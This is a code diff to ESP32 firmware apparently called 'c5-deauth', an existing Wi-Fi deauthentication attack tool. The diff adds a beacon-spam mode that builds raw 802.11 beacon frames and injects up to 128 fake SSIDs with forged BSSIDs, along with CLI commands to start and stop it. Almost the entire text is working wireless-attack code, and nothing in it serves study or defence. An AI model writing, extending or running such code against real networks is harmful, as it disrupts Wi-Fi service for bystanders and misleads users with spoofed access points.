@@ -13,6 +13,7 @@
 #include "nvs_flash.h"
 
 #define MAX_BSSIDS 8
+#define MAX_FAKES 128
 #define FRAME_LEN 26
 
 static volatile bool s_attack = false;
@@ -24,6 +25,14 @@ static int s_bssid_ch[MAX_BSSIDS];
 static int s_bssid_count = 0;
 static int s_channel = 1;
 static volatile uint32_t s_sent = 0;
+
+static char s_fake_ssid[MAX_FAKES][33];
+static uint8_t s_fake_bssid[MAX_FAKES][6];
+static int s_fake_count = 0;
+static volatile bool s_beacon_run = false;
+static TaskHandle_t s_beacon_task = NULL;
+static int s_beacon_ch = 36;
+static volatile uint32_t s_beacon_sent = 0;
 
 static esp_err_t set_band_for_channel(int channel);
 
@@ -52,6 +61,7 @@ static void wifi_init(void)
     ESP_ERROR_CHECK(esp_netif_init());
     ESP_ERROR_CHECK(esp_event_loop_create_default());
     esp_netif_create_default_wifi_sta();
+    esp_netif_create_default_wifi_ap();
 
     wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
     ESP_ERROR_CHECK(esp_wifi_init(&cfg));
@@ -281,10 +291,250 @@ static void do_rsn(const uint8_t bssid[6])
     }
 }
 
+static int build_beacon(uint8_t *f, const uint8_t bssid[6], const char *ssid, int ch, uint16_t seq)
+{
+    static const uint8_t rates_2g[8] = {0x82, 0x84, 0x8B, 0x96, 0x0C, 0x12, 0x18, 0x24};
+    static const uint8_t rates_5g[8] = {0x8C, 0x12, 0x98, 0x24, 0xB0, 0x48, 0x60, 0x6C};
+    const uint8_t *rates = (ch > 14) ? rates_5g : rates_2g;
+    int n = 0;
+
+    f[n++] = 0x80;              // beacon
+    f[n++] = 0x00;
+    f[n++] = 0x00;              // duration
+    f[n++] = 0x00;
+    memset(f + n, 0xFF, 6);     // DA: broadcast
+    n += 6;
+    memcpy(f + n, bssid, 6);    // SA
+    n += 6;
+    memcpy(f + n, bssid, 6);    // BSSID
+    n += 6;
+    f[n++] = seq & 0xFF;
+    f[n++] = seq >> 8;
+
+    memset(f + n, 0, 8);        // timestamp
+    n += 8;
+    f[n++] = 0x64;              // beacon interval 100 TU
+    f[n++] = 0x00;
+    f[n++] = 0x11;              // capability: ESS + short preamble/slot
+    f[n++] = 0x04;
+
+    int slen = (int)strlen(ssid);
+    if (slen > 32) {
+        slen = 32;
+    }
+    f[n++] = 0;                 // SSID IE
+    f[n++] = (uint8_t)slen;
+    memcpy(f + n, ssid, slen);
+    n += slen;
+
+    f[n++] = 1;                 // supported rates
+    f[n++] = 8;
+    memcpy(f + n, rates, 8);
+    n += 8;
+
+    f[n++] = 3;                 // DS parameter: channel
+    f[n++] = 1;
+    f[n++] = (uint8_t)ch;
+
+    static const uint8_t ht_cap[26] = {
+        0x0C, 0x00, 0x1B,
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+        0x00, 0x00,
+        0x00, 0x00, 0x00, 0x00,
+        0x00,
+    };
+    f[n++] = 45;                // HT capabilities
+    f[n++] = 26;
+    memcpy(f + n, ht_cap, 26);
+    n += 26;
+
+    static const uint8_t vht_cap[12] = {
+        0x0F, 0x00, 0x00, 0x00,
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    };
+    f[n++] = 191;               // VHT capabilities
+    f[n++] = 12;
+    memcpy(f + n, vht_cap, 12);
+    n += 12;
+
+    f[n++] = 192;               // VHT operation: 20/40 MHz
+    f[n++] = 5;
+    f[n++] = 0x00;
+    f[n++] = 0x00;
+    f[n++] = 0x00;
+    f[n++] = 0x00;
+    f[n++] = 0x00;
+
+    return n;
+}
+
+static void beacon_task(void *arg)
+{
+    uint8_t frame[192];
+    uint16_t seq = 0;
+    uint32_t last = esp_timer_get_time() / 1000;
+
+    while (s_beacon_run) {
+        for (int i = 0; i < s_fake_count; i++) {
+            int len = build_beacon(frame, s_fake_bssid[i], s_fake_ssid[i], s_beacon_ch, seq++);
+            esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, frame, len, false);
+            if (err == ESP_OK) {
+                s_beacon_sent++;
+            } else if (err == ESP_ERR_NO_MEM) {
+                vTaskDelay(pdMS_TO_TICKS(5));
+            }
+            if (s_fake_count > 16) {
+                vTaskDelay(pdMS_TO_TICKS(15));
+            }
+        }
+        vTaskDelay(pdMS_TO_TICKS(s_fake_count > 16 ? 0 : 100));
+
+        uint32_t now = esp_timer_get_time() / 1000;
+        if (now - last >= 5000) {
+            printf("beacons %lu pps, %d ssids on ch %d\n",
+                   (unsigned long)(s_beacon_sent / 5), s_fake_count, s_beacon_ch);
+            s_beacon_sent = 0;
+            last = now;
+        }
+    }
+    printf("beacons stopped\n");
+    s_beacon_task = NULL;
+    vTaskDelete(NULL);
+}
+
+static void restore_sta_mode(void)
+{
+    esp_wifi_stop();
+    esp_wifi_set_mode(WIFI_MODE_STA);
+    esp_wifi_start();
+    esp_wifi_set_country_code("CN", true);
+    wifi_bandwidths_t bws = {
+        .ghz_2g = WIFI_BW20,
+        .ghz_5g = WIFI_BW20,
+    };
+    esp_wifi_set_bandwidths(WIFI_IF_STA, &bws);
+    esp_wifi_set_max_tx_power(80);
+}
+
+static void stop_beacons(void)
+{
+    if (!s_beacon_run) {
+        printf("beacons not running\n");
+        return;
+    }
+    s_beacon_run = false;
+    vTaskDelay(pdMS_TO_TICKS(300));
+    restore_sta_mode();
+    printf("beacons stopped, STA restored\n");
+}
+
+static void start_beacons(char *list)
+{
+    if (s_attack) {
+        printf("stop attack first\n");
+        return;
+    }
+    if (s_beacon_run) {
+        printf("beacons already running; stopbeacons first\n");
+        return;
+    }
+
+    s_fake_count = 0;
+    int auto_count = 0;
+    if (sscanf(list, "auto %d", &auto_count) == 1 && auto_count > 0) {
+        if (auto_count > MAX_FAKES) {
+            auto_count = MAX_FAKES;
+        }
+        for (int i = 0; i < auto_count; i++) {
+            snprintf(s_fake_ssid[i], sizeof(s_fake_ssid[i]), "5G-Test-%d", i + 1);
+            uint8_t b[6] = {0x00, 0x11, 0x22, 0x33, 0x44, (uint8_t)(i + 1)};
+            memcpy(s_fake_bssid[i], b, 6);
+        }
+        s_fake_count = auto_count;
+    } else {
+        char *save = NULL;
+        for (char *tok = strtok_r(list, ",", &save); tok && s_fake_count < MAX_FAKES;
+             tok = strtok_r(NULL, ",", &save)) {
+            while (*tok == ' ') {
+                tok++;
+            }
+            int len = (int)strlen(tok);
+            while (len > 0 && (tok[len - 1] == ' ' || tok[len - 1] == '\r' || tok[len - 1] == '\n')) {
+                tok[--len] = '\0';
+            }
+            if (len == 0) {
+                continue;
+            }
+            if (len > 32) {
+                len = 32;
+            }
+            memcpy(s_fake_ssid[s_fake_count], tok, len);
+            s_fake_ssid[s_fake_count][len] = '\0';
+            uint8_t b[6] = {0x00, 0x11, 0x22, 0x33, 0x44, (uint8_t)(s_fake_count + 1)};
+            memcpy(s_fake_bssid[s_fake_count], b, 6);
+            s_fake_count++;
+        }
+    }
+
+    if (s_fake_count == 0) {
+        printf("usage: beaconspam ssid1,ssid2,... | beaconspam auto <n>\n");
+        return;
+    }
+
+    s_beacon_ch = s_channel;
+    if (s_beacon_ch <= 0) {
+        s_beacon_ch = 36;
+    }
+
+    esp_wifi_stop();
+    esp_err_t err = esp_wifi_set_mode(WIFI_MODE_AP);
+    if (err != ESP_OK) {
+        printf("AP mode failed: %s\n", esp_err_to_name(err));
+        restore_sta_mode();
+        return;
+    }
+
+    wifi_config_t ap_cfg = {0};
+    memcpy(ap_cfg.ap.ssid, "cfg", 3);
+    ap_cfg.ap.ssid_len = 3;
+    ap_cfg.ap.channel = (uint8_t)s_beacon_ch;
+    ap_cfg.ap.authmode = WIFI_AUTH_OPEN;
+    ap_cfg.ap.max_connection = 1;
+    ap_cfg.ap.ssid_hidden = 1;
+    ap_cfg.ap.beacon_interval = 100;
+
+    err = esp_wifi_set_config(WIFI_IF_AP, &ap_cfg);
+    if (err == ESP_OK) {
+        err = esp_wifi_start();
+    }
+    if (err != ESP_OK) {
+        printf("AP beacon setup failed: %s\n", esp_err_to_name(err));
+        restore_sta_mode();
+        return;
+    }
+
+    esp_wifi_set_channel(s_beacon_ch, WIFI_SECOND_CHAN_NONE);
+
+    s_beacon_sent = 0;
+    s_beacon_run = true;
+    xTaskCreate(beacon_task, "beacon", 4096, NULL, 3, &s_beacon_task);
+
+    printf("beacon spam (AP iface) on ch %d: ", s_beacon_ch);
+    for (int i = 0; i < s_fake_count; i++) {
+        printf("%s%s", i ? "," : "", s_fake_ssid[i]);
+    }
+    printf("\n");
+}
+
 static void do_scan(void)
 {
     if (s_attack) {
         printf("stop attack first\n");
+        return;
+    }
+    if (s_beacon_run) {
+        printf("stop beacons first\n");
         return;
     }
     wifi_scan_config_t sc = {0};
@@ -440,6 +690,9 @@ static void print_help(void)
     printf("  bssid <mac> [ch]     add AP BSSID with optional channel\n");
     printf("  clear                clear BSSID list\n");
     printf("  ch <channel>         set channel (1-13, 36-165)\n");
+    printf("  beaconspam <ssid,..> fake beacons on current channel\n");
+    printf("  beaconspam auto <n>  generate n fake 5G SSIDs (max 128)\n");
+    printf("  stopbeacons          stop fake SSID beacons\n");
     printf("  start / stop         start or stop deauth\n");
     printf("  status               show config\n");
 }
@@ -475,7 +728,7 @@ static int read_line(char *buf, int cap)
 
 static void cli_task(void *arg)
 {
-    char line[160];
+    char line[320];
     printf("\nc5-deauth ready\n");
     print_help();
     printf("c5> ");
@@ -499,6 +752,8 @@ static void cli_task(void *arg)
         } else if (!strncmp(p, "findsta ", 8)) {
             if (s_attack) {
                 printf("stop attack first\n");
+            } else if (s_beacon_run) {
+                printf("stop beacons first\n");
             } else {
                 char macbuf[32] = {0};
                 char chbuf[64] = {0};
@@ -529,6 +784,8 @@ static void cli_task(void *arg)
         } else if (!strncmp(p, "rsn ", 4)) {
             if (s_attack) {
                 printf("stop attack first\n");
+            } else if (s_beacon_run) {
+                printf("stop beacons first\n");
             } else {
                 uint8_t mac[6];
                 if (parse_mac(p + 4, mac)) {
@@ -565,6 +822,8 @@ static void cli_task(void *arg)
         } else if (!strncmp(p, "ch ", 3)) {
             if (s_attack) {
                 printf("stop attack first\n");
+            } else if (s_beacon_run) {
+                printf("stop beacons first\n");
             } else {
                 s_channel = atoi(p + 3);
                 printf("ch %d\n", s_channel);
@@ -573,11 +832,17 @@ static void cli_task(void *arg)
                     printf("band switch failed: %s\n", esp_err_to_name(err));
                 }
             }
+        } else if (!strncmp(p, "beaconspam ", 11)) {
+            start_beacons(p + 11);
+        } else if (!strncmp(p, "stopbeacons", 11)) {
+            stop_beacons();
         } else if (!strncmp(p, "start", 5)) {
             if (!s_target_set || s_bssid_count == 0) {
                 printf("set target and at least one bssid first\n");
             } else if (s_attack) {
                 printf("already running\n");
+            } else if (s_beacon_run) {
+                printf("stop beacons first\n");
             } else {
                 s_attack = true;
                 xTaskCreate(attack_task, "attack", 4096, NULL, 5, &s_attack_task);
@@ -589,6 +854,8 @@ static void cli_task(void *arg)
             printf("target %02X:%02X:%02X:%02X:%02X:%02X, bssids %d, ch %d, running %d\n",
                    s_target[0], s_target[1], s_target[2], s_target[3], s_target[4], s_target[5],
                    s_bssid_count, s_channel, s_attack);
+            printf("beacons running %d, ssids %d, ch %d\n",
+                   s_beacon_run, s_fake_count, s_beacon_ch);
         } else {
             printf("unknown command; type help\n");
         }
